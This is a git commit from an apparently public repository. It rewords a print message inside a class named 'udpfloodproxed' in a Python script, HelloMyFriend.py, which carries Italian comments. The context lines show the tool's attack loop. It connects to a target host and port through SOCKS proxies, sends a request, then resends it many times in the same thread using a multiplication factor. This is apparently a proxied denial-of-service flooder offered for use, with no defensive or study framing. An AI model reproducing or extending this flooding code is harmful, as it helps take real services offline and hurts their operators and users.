3e0704e157396013078ea40ebd9ab2265e052884
bossy0 <36817786+bossy0@users.noreply.github.com>
2018-04-22 00:22:38 +0300

    Update HelloMyFriend.py

--- HelloMyFriend.py
+++ HelloMyFriend.py
@@ -465,7 +465,7 @@ class udpfloodproxed(threading.Thread): # la classe del multithreading
 				s = socks.socksocket() # creazione socket
 				s.connect((str(url2),int(port))) # connessione
 				s.send(p) # invio
-				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
+				print ("Package Sending " + str(proxy[0]+":"+proxy[1]) + " ✓", self.counter) # print req + counter
 				try: # invia altre richieste nello stesso thread
 					for y in range(multiple): # fattore di moltiplicazione
 						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
